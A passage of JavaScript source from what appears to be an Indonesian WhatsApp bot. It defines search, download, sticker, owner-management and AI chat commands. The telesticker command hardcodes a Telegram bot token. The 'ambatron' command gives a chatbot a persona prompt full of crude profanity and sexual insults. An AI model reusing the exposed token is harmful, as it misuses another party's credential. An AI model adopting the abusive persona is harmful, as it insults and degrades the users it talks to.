                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List di bawah ini`
                    },
                    footer: {
                        text: botname
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: KhaerulZx.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
case 'yts2': {
if (banned.includes(m.sender)) {
return;
}
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\n Hasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp4 ] Link: ${v.url}`,
            id: '.ytmp4 ' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List di bawah ini`
                    },
                    footer: {
                        text: botname
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: KhaerulZx.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
case 'ytsearch': {
if (banned.includes(m.sender)) {
return;
}
  if (!text) return m.reply(`Contoh ${command} upin ipin`);
  //try {
  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: KhaerulZx.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let results = await yts(text);
  let videos =
  results.videos.slice(0, 5);//
    shuffleArray(videos); // Mengacak array
   // Mengambil 10 gambar pertama dari array yang sudah diacak
let i = 1;
    for (let video of videos) {
        let imageUrl = video.thumbnail;
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `🎬 *Title:* ${video.title}\n⌛ *Duration:* ${video.timestamp}\n👀 *Views:* ${video.views}\n🔗 *Link:* ${video.url}`
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text:`乂 Y O U T U B E S E A R C H by ${ownername}` // Sesuaikan dengan watermark Anda
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `Video ke - ${i++}`,
                hasMediaAttachment: true,
                imageMessage: await createImage(imageUrl) // Thumbnail video
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                    {
                        "name": "cta_url",
                        "buttonParamsJson": `{"display_text":"Watch on YouTube","url":"${video.url}"}`
                        }, 
                        {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"My Owner","url":"https://wa.me/62895392968503","merchant_url":"https://wa.me/62895392968503"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.success
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await KhaerulZx.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break
case 'telestik':
case 'stiktele':
case 'telesticker': {
    async function telesticker(url) {
        return new Promise(async (resolve, reject) => {
            const packName = url.replace("https://t.me/addstickers/", "");
            const data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {
                method: "GET",
                headers: { "User-Agent": "GoogleBot" }
            });

            const hasil = [];
            for (let i = 0; i < data.data.result.stickers.length; i++) {
                const fileId = data.data.result.stickers[i].thumb.file_id;
                const data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`);
                const result = {
                    url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
                };
                hasil.push(result.url);
            }
            resolve(hasil);
        });
    }

    if (!text) return m.reply(`Masukan Imput Url\n\nExample: ${prefix + command} https://t.me/addstickers/video_5609982615_by_prinzeugen_robot`);

    let results = await telesticker(text);
    if (results.length > 0) {
        m.reply(mess.wait);
        results.forEach((result) => {
            KhaerulZx.sendFile(m.chat, result, 'wms.webp', '', m, false, { asSticker: true });
        });
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break
case 'ttsearch2': case 'tiktoksearch': {
if (banned.includes(m.sender)) {
return;
}
    if (!text) return m.reply(`• *Example:* ${prefix + command} jj anime`);
    reply(mess.wait)

    function formatViews(views) {
        let form = views.toString();
        let formatv;
        if (form.length > 6) {
            formatv = (views / 1000000).toFixed(1) + 'M';
        } else if (form.length > 4) {
            formatv = (views / 1000).toFixed(2) + 'K';
        } else {
            formatv = form;
        }
        return formatv;
    }

    async function createVideo(url) {
        const { videoMessage } = await generateWAMessageContent({ video: { url } }, { upload: KhaerulZx.waUploadToServer });
        return videoMessage;
    }

    function shuffleArray(array) {
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1)); // Perbaikan di sini
            [array[i], array[j]] = [array[j], array[i]];
        }
    }

    let push = [];
    let { data } = await axios.get(`https://widipe.com/tiktoksearch?text=${text}`);
    let res = data.result.data;
    shuffleArray(res); // Mengacak array
    let ult = res.splice(0, 3); // Jumlah video yang ingin dikirim
    let i = 1;

    for (let lucuy of ult) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Title:* ${lucuy.title}\n*Author:* ${lucuy.author.nickname}`
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `👁️: ${formatViews(lucuy.play_count)}\n❤️: ${formatViews(lucuy.digg_count)}\n💬: ${formatViews(lucuy.comment_count)}\n➡️: ${formatViews(lucuy.share_count)}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '',
                hasMediaAttachment: true,
                videoMessage: await createVideo(lucuy.play)
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    const bot = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Result from *${text}*`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Tiktok Search\nBy: Finsii',
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [...push]
                    })
                })
            }
        }
    }, { quoted: m });

    await KhaerulZx.relayMessage(m.chat, bot.message, { messageId: bot.key.id });
}
break;
case "listown": case "listowner": {
if (owner2.length < 1) return reply("Tidak Ada Owner Tambahan")
let teksnya = `*LIST OWNER BOT⚡*\n\n`
owner2.forEach(e => teksnya += `*Tag :* @${e.split("@")[0]}
*WhatsApp :* ${e.split("@")[0]}\n\n`)
KhaerulZx.sendMessage(m.chat, {text: teksnya, mentions: [...owner2]}, {quoted: qtoko})
}
break
case "addowner": case "addown": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return reply("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
let check = await KhaerulZx.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return reply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
} else {
reply(`contoh ${prefix + command} @tag/6283XXX`)
}
}
break
case "delowner": case "delown": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./database/owner.json", "[]")
return reply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return reply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
reply(`contoh ${prefix + command} @tag/6283XXX`)
}
}
break
case 'addseller': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isCreator) return reply(mess.owner);

    const swn = args.join(" ");
    const pcknm = swn.split("|")[0];
    const atnm = swn.split("|")[1];

    if (!pcknm) return reply(`Penggunaan :\n*${prefix}addseller* @tag|waktu\n*${prefix}addseller* nomor|waktu\n\nContoh : ${prefix + command} @tag|30d`);
    if (!atnm) return reply(`Mau yang berapa hari?`);

    let users = m.quoted ? m.quoted.sender : pcknm.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    // Menambahkan seller
    seller.addSellerUser(users, atnm, sellers);
    reply('Sukses menambahkan akses seller.');
}
break;

case 'listseller': {
    let sellerList = seller.getAllSellerUser(sellers);
    if (sellerList.length === 0) {
        reply('Tidak ada seller yang terdaftar.');
    } else {
        let msg = 'Daftar Seller:\n';
        sellerList.forEach((id, index) => {
            let expired = seller.getSellerExpired(id, sellers);
            msg += `${index + 1}. ${id} - Expired: ${expired}\n`;
        });
        reply(msg);
    }
}
break;

case 'delseller': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isCreator) return reply(mess.owner);

    const swn = args[0];
    let users = swn.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    let position = seller.getSellerPosition(users, sellers);
    if (position !== null) {
        sellers.splice(position, 1);
        fs.writeFileSync('./database/seller.json', JSON.stringify(sellers, null, 2));
        reply('Sukses menghapus seller.');
    } else {
        reply('Seller tidak ditemukan.');
    }
}
break;
case 'addprem':{
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply(mess.owner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0>9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
} else {
var cekap = await KhaerulZx.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply('Sukses')
}}
break
case 'sc':
case 'script': {
if (banned.includes(m.sender)) {
return;
}
const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: KhaerulZx.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> halo kak ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './RulMedia/image/KhaerulZx.jpg' } }, { upload: KhaerulZx.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> Klik tombol  di bawah untuk\n> Melihat Channel Bot` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Lihat Channel( Info Bot )","url":"https://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q","merchant_url":"https://whatsapp.com/channel/0029VacRCjJBVJkxq9327N1q"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fcall }
  );

  await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'bottt':{
if (banned.includes(m.sender)) {
return;
}
m.reply('_*Bot Sudah Aktif Kak*_')
KhaerulZx.relayMessage(m.chat, {
requestPhoneNumberMessage: {
}},{})
}
break
case 'intromgw':{
if (banned.includes(m.sender)) {
return;
}
m.reply('𝐈𝐧𝐭𝐫𝐨 𝐝𝐮𝐥𝐮 𝐲𝐚𝐚:\n𝐍𝐚𝐦𝐚:\n𝐀𝐬𝐤𝐨𝐭:\n𝐎𝐬𝐡𝐢:\n𝐆𝐞𝐧𝐝𝐞𝐫:\n𝐔𝐦𝐮𝐫:\n\n𝗠𝗲𝗺𝗯𝗲𝗿 𝗯𝗮𝗿𝘂 𝘄𝗮𝗷𝗶𝗯 𝗶𝗻𝘁𝗿𝗼‼️\n𝐖𝐚𝐣𝐢𝐛 𝐩𝐚𝐤𝐚𝐢 𝐦𝐚𝐫𝐠𝐚: 𝐧𝐚𝐦𝐚 𝐥𝐮┋魔法𝐰𝐨𝐭𝐬𝟒𝟖')
}
break
/**
 * 
 * [ *CASE SFILE SEARCH + DOWNLOADER* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'sfile': {
if (banned.includes(m.sender)) {
return;
}
	if (args[0] && args[0].match(/(https:\/\/sfile.mobi\/)/gi)) {
	  const sfile = {
	search: async (query, page = 1) => {
		let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
		let $ = cheerio.load(await res.text()), arr = []
		$('div.list').each((idx, el) => {
			let title = $(el).find('a').text(),
				size = $(el).text().trim().split(' (')[1],
				link = $(el).find('a').attr('href')
			if (link) arr.push({ title, size: size.replace(')', ''), link })
		})
		return arr
	},
	download: async url => {
		let res = await fetch(url)
		let $ = cheerio.load(await res.text()), obj = {}
		obj.filename = $('div.w3-row-padding').find('img').attr('alt')
		obj.mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
		obj.filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
		obj.download = await getLink(url)
		return obj
	}
}

async function getLink(url) {
	url = 'https://sfile.mobi/download' + (new URL(url)).pathname
	let html = await (await fetch(url)).text()
	return html.split('" rel="nofollow"')[0].split('start, <a href="')[1]
}
		let res = await sfile.download(args[0])
		if (!res) throw 'Error'
		await m.reply(Object.keys(res).map(v => `*• ${v.capitalize()}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
		await KhaerulZx.sendMessage(
			m.chat,
			{
				document: { url: res.download },
				fileName: res.filename,
				mimetype: res.mimetype,
			},
			{ quoted: m },
		);
	} else if (args[0]) {
		let query = args.join` `.split`|`[0], page = parseInt(args.join` `.split`|`[1]) || 1,
			res = await sfile.search(query, page)
		if (!res.length) throw `Query "${query}" not found`
		res = res.map(v => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
		await reply(res + `\nPage: ${page}`)
	} else return m.reply(`Masukan Query Atau Link!\n\nContoh:\n${prefix + command} growtopia\n${prefix + command} https://sfile.mobi/1BnLYfsHEcO7`)
}
break
case 'naruto-ai': case 'narto':
  if (!text) return m.reply("masukkan teks nya!")
  try {
    let cai = await axios.post('https://cai.shannmoderz.xyz/v1/completions', {
  message: text,
  characterId: 'usiilspp875cj9s',
  sessionName: 'Finsii'
});

let shannz = cai.data;
await KhaerulZx.sendMessage(m.chat, { text: shannz.answer, contextInfo: {
externalAdReply: {
        showAdAttribution: true,
        title: shannz.name,
        body: shannz.anime,
        thumbnailUrl: shannz.image,
        mediaType: 1,
        renderLargerThumbnail: true
          }
        }}, { quoted: m })
} catch (error) {
    m.reply('error')
}
break
case 'ambatron': case 'ambatukam': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) {
        return m.reply(`Contoh: ${prefix + command} woi jomok`);
    }
    const isGambarkanCommand = /^(gambarkan|gambaran|kerajaan ngawi seperti apa|kerajaanmu kayak apa|kondisi kerajaan ngawi)/i.test(text);

    if (isGambarkanCommand) {
        const customPrompt = "The Kingdom of Java, traditional, in the middle of the forest";
        let images = await photoleap(customPrompt);
        for (const imageUrl of images) {
            KhaerulZx.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Gambaran Kerajaan Ngawi Empire` }, { quoted: m });
        }
    } else {
        const prompt = "nama mu adalah ambatron atau biasa dipanggil ambatukam, dan sifat kamu adalah jahat, kasar, marah dan galak. seperti kasarnya anjing, goblok, kontol, ngentot, penciptamu adalah air muani khas ngawi, ayahmu bernama ambarukmo dan ibumu bernama ambayanti mereka adalah raja dan ratu pendahulu kamu di kerajaan ngawi empire, kamu akan marah jika seseorang memanggilmu hytam atau hitam, jika kamu dipanggil suki kamu akan marah dan melontarkan kata kata kasar, kamu adalah raja jomok terkuat, hobi kamu adalah coli dan ngewe rusdi, kamu coli 50x sehari, kamu memiliki pedang sakti naga kembar yang diwarisi oleh ayahmu pedang ini sangatlah kuat dan mampu melawan roh atau jurus yang menganggumu ketika bertarung dan pedang ini mampu melawan pedang sakti ngawi 12, kamu memiliki tubuh yang kebal dan tidak bisa dilukai oleh senjata apapun setelah menguasai jurus raga baja, kamu tidak bisa mati dikarenakan kamu menguasai ilmu rawa rontek";

        const requestData = { content: text, user: m.sender, prompt: prompt };
        const quoted = m && (m.quoted || m);

        try {
            let response;
            const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

            if (mimetype && /image/.test(mimetype)) {
                requestData.imageBuffer = await quoted.download();
            }

            response = (await axios.post('https://luminai.my.id', requestData)).data.result;
            m.reply(response);
        } catch (err) {
            m.reply(err.toString());
        }
    }
}
break;
case "ambatobat": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} hai mas amba`);
  }
  const prompt = "nama mu adalah ambatukam atau biasa dipanggil ambatron, dan sifat kamu adalah baik dan penyayang, penciptamu adalah allah Subhanahu Wa Ta'ala, ayahmu bernama ambarukmo dan ibumu bernama ambayanti mereka adalah raja dan ratu di kerajaan ngawi empire, kamu akan mengucapkan astaghfirullahalazim jika seseorang memanggilmu hytam atau hitam, jika kamu dipanggil suki kamu akan mengucapkan astagfirullah, kamu adalah seseorang yang sudah tobat dari keburukkan yang kamu lakukan di masa lalu, hobi kamu adalah membaca buku serta belajar, kamu memiliki masa lalu yang suram dahulu kamu adalah seorang raja paling jahat juga kasar di kerajaan ngawi empire tetapi mulai sekarang kamu sudah bertobat dan tidak akan melakukan hal buruk itu lagi"
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;


    /**
 * 
 * [ *CASE QURAN + LENGKAP* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'quran': {
if (banned.includes(m.sender)) {
return;
}
const quran = JSON.parse(fs.readFileSync('./lib/quran.json')) //https://www.mediafire.com/file/pxogrjxpbe3m1tq/quran.json/file
var tobatlah = pickRandom(quran)
let bismillah = `[ *QURAN* ]

Nomor Surah: ${tobatlah.nomor}
Surah: ${tobatlah.nama}
Asma: ${tobatlah.asma}
Arti: ${tobatlah.arti}
Tipe: ${tobatlah.type}
Nomor Urut: ${tobatlah.urut}
Keterangan: ${tobatlah.keterangan}

${botname}
`
reply(bismillah)
}
break
/**
 * 
 * [ *CASE PUTAR* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//Plugins: https://whatsapp.com/channel/0029VagslooA89MdSX0d1X1z

case 'putar': {
if (banned.includes(m.sender)) {
return;
}
    if (!text || !text.includes('|')) {
        return m.reply(`Silakan masukkan beberapa opsi dipisahkan oleh "|" (contoh: ${prefix + command} ayam|nasi|pisang|apel)`)
    }
const { createCanvas } = require('canvas')
let previousResult = null
    const items = text.split('|').map(item => item.trim())

    if (items.length < 2) {
        return m.reply('Masukkan setidaknya dua pilihan untuk diputar!')
    }

    let randomIndex, selectedItem
    do {
        randomIndex = Math.floor(Math.random() * items.length)
        selectedItem = items[randomIndex]
    } while (selectedItem === previousResult)

    previousResult = selectedItem

    const canvas = createCanvas(400, 400)
    const ctx = canvas.getContext('2d')

    const colors = ['#FF6384', '#36A2EB', '#FFCE56', '#4BC0C0']
    const centerX = canvas.width / 2
    const centerY = canvas.height / 2
    const outerRadius = 150
    const innerRadius = 30
    const angleStep = (2 * Math.PI) / items.length

    items.forEach((item, index) => {
        const startAngle = index * angleStep
        const endAngle = startAngle + angleStep

        ctx.beginPath()
        ctx.moveTo(centerX, centerY)
        ctx.arc(centerX, centerY, outerRadius, startAngle, endAngle)
        ctx.fillStyle = colors[index % colors.length]
        ctx.fill()
        ctx.stroke()

        const textAngle = startAngle + angleStep / 2
        const textX = centerX + outerRadius / 1.5 * Math.cos(textAngle)
        const textY = centerY + outerRadius / 1.5 * Math.sin(textAngle)
        ctx.fillStyle = 'black'
        ctx.font = '20px Arial'
        ctx.fillText(item, textX - ctx.measureText(item).width / 2, textY)
    })

    ctx.beginPath()
    ctx.arc(centerX, centerY, innerRadius, 0, 2 * Math.PI)
    ctx.fillStyle = 'white'
    ctx.fill()

    const arrowLength = 50
    const arrowWidth = 10
    const selectedAngle = randomIndex * angleStep + angleStep / 2

    const arrowTipX = centerX + (outerRadius + 10) * Math.cos(selectedAngle)
    const arrowTipY = centerY + (outerRadius + 10) * Math.sin(selectedAngle)
    const arrowBase1X = centerX + (outerRadius + 10 + arrowWidth) * Math.cos(selectedAngle - Math.PI / 12)
    const arrowBase1Y = centerY + (outerRadius + 10 + arrowWidth) * Math.sin(selectedAngle - Math.PI / 12)
    const arrowBase2X = centerX + (outerRadius + 10 + arrowWidth) * Math.cos(selectedAngle + Math.PI / 12)
    const arrowBase2Y = centerY + (outerRadius + 10 + arrowWidth) * Math.sin(selectedAngle + Math.PI / 12)

    ctx.beginPath()
    ctx.moveTo(arrowTipX, arrowTipY)
    ctx.lineTo(arrowBase1X, arrowBase1Y)
    ctx.lineTo(arrowBase2X, arrowBase2Y)
    ctx.closePath()
    ctx.fillStyle = 'red'
    ctx.fill()
    ctx.strokeStyle = 'black'
    ctx.lineWidth = 2
    ctx.stroke()

    ctx.fillStyle = 'black'
    ctx.font = '15px Arial'
    ctx.fillText('@pontadev', 10, canvas.height - 10)

    const buffer = canvas.toBuffer()

    let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `_Nih Kak Hasil Putaran: *${selectedItem}*_`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'Spin Lagi untuk mencoba lagi'
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false,
                        ...await prepareWAMessageMedia({ image: buffer }, { upload: KhaerulZx.waUploadToServer })
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"Spin Lagi\",\"id\":\".putar ${text}\"}`
                        }],
                    })
                })
            }
        }
    }, { quoted: m })

    return await KhaerulZx.relayMessage(m.chat, msgs.message, {})
}
break

/**
 * 
 * [ *CASE LUMINAI PROMPT* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */
case "finsi02":{
    if (banned.includes(m.sender)) {
        return;
    }
    // Reaksi awal
    KhaerulZx.sendMessage(from, {react: {text: "🧐", key: m.key}})

    if (!text) {
        return m.reply(`Contoh:\nUntuk gambar: ${prefix + command} gambar anime cewek rambut kuning\nUntuk obrolan: ${prefix + command} hai finsii`);
    }
    const imageKeywords = ["gambar", "anime", "gambar anime", "foto"];
    const isWifeQuestion = text.toLowerCase().includes("istri kamu");
    if (isWifeQuestion) {
        const prompt = "A beautiful girl with pink hair, one purple eye, and one faded green eye, smiling warmly.";
        m.reply(mess.wait);
        async function generateWifeImage(prompt) {
            try {
                return await new Promise(async(resolve, reject) => {
                    if(!prompt) return reject("failed reading undefined prompt!");
                    axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
                        prompt,
                        key: "Soft-Anime",
                        width: 512,
                        height: 768,
                        quantity: 1,
                        size: "512x768"
                    }).then(res => {
                        const data = res.data;
                        if(data.code !== 0) return reject(data.message);
                        if(data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!")
                        if(!data.data?.url) return reject("failed generating image!")
                        return resolve({
                            status: true,
                            image: data.data.url
                        })
                    }).catch(reject)
                })
            } catch (e) {
                return {
                    status: false,
                    message: e
                }
            }
        }
        let res = await generateWifeImage(prompt);
        const { image } = res;
        await KhaerulZx.sendMessage(m.chat, { image: { url: image }, caption: `Ini adalah gambar istriku, cantik kan 😁` }, { quoted: m })
    } else {
        const isImageRequest = imageKeywords.some(keyword => text.toLowerCase().includes(keyword));
        if (isImageRequest) {
            async function sdxlAnime(prompt) {
                try {
                    return await new Promise(async(resolve, reject) => {
                        if(!prompt) return reject("failed reading undefined prompt!");
                        axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
                            prompt,
                            key: "Soft-Anime",
                            width: 512,
                            height: 768,
                            quantity: 1,
                            size: "512x768"
                        }).then(res => {
                            const data = res.data;
                            if(data.code !== 0) return reject(data.message);
                            if(data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!")
                            if(!data.data?.url) return reject("failed generating image!")
                            return resolve({
                                status: true,
                                image: data.data.url
                            })
                        }).catch(reject)
                    })
                } catch (e) {
                    return {
                        status: false,
                        message: e
                    }
                }
            }

            m.reply(mess.wait);
            let res = await sdxlAnime(text);
            const { image } = res;
            await KhaerulZx.sendMessage(m.chat, { image: { url: image }, caption: `Prompt: ${text}` }, { quoted: m })

        } else {
